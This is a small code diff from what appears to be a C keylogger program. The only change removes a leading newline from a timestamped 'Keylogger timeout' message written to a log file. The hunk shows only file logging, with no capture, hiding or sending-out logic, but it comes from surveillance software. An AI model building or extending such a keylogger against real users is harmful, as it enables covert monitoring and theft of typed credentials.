@@ -105,7 +105,7 @@ int keylogger(FILE *file_pointer,
       // Reopen new file.
       file_pointer_new = fopen(file_name, "a");
       // Insert data into the file.
-      fprintf(file_pointer_new, "\nKeylogger timeout (10s) - Data - %s", asctime(localtime(&time_now)));
+      fprintf(file_pointer_new, "Keylogger timeout (10s) - Data - %s", asctime(localtime(&time_now)));
       // Clean buffer.
       fflush(file_pointer_new);
       // Set last key time.
